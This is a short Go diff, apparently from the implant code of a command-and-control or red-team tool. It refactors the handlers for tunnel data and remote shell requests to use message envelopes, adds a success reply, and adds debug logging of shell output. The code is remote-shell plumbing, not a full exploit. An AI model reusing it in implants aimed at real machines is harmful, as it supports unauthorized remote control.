@@ -31,9 +31,9 @@ func GetTunnelHandlers() map[uint32]TunnelHandler {
 	return tunnelHandlers
 }
 
-func tunnelDataHandler(req []byte, connection *transports.Connection) {
+func tunnelDataHandler(envelope *pb.Envelope, connection *transports.Connection) {
 	tunData := &pb.TunnelData{}
-	proto.Unmarshal(req, tunData)
+	proto.Unmarshal(envelope.Data, tunData)
 	tunnel := connection.Tunnel(tunData.TunnelID)
 	if tunnel != nil {
 		tunnel.Writer.Write(tunData.Data)
@@ -44,10 +44,10 @@ func tunnelDataHandler(req []byte, connection *transports.Connection) {
 	}
 }
 
-func shellReqHandler(req []byte, connection *transports.Connection) {
+func shellReqHandler(envelope *pb.Envelope, connection *transports.Connection) {
 
 	shellReq := &pb.ShellReq{}
-	err := proto.Unmarshal(req, shellReq)
+	err := proto.Unmarshal(envelope.Data, shellReq)
 	if err != nil {
 		return
 	}
@@ -61,6 +61,12 @@ func shellReqHandler(req []byte, connection *transports.Connection) {
 	}
 	connection.AddTunnel(tunnel)
 
+	shellResp, _ := proto.Marshal(&pb.Shell{Success: true})
+	connection.Send <- &pb.Envelope{
+		ID:   envelope.ID,
+		Data: shellResp,
+	}
+
 	go func() {
 		defer connection.RemoveTunnel(tunnel.ID)
 		for {
@@ -72,6 +78,9 @@ func shellReqHandler(req []byte, connection *transports.Connection) {
 				// {{end}}
 				return
 			}
+			// {{if .Debug}}
+			log.Printf("[shell] stdout %d bytes on tunnel %d", n, tunnel.ID)
+			// {{end}}
 			data, err := proto.Marshal(&pb.TunnelData{
 				TunnelID: tunnel.ID,
 				Data:     readBuf[:n],
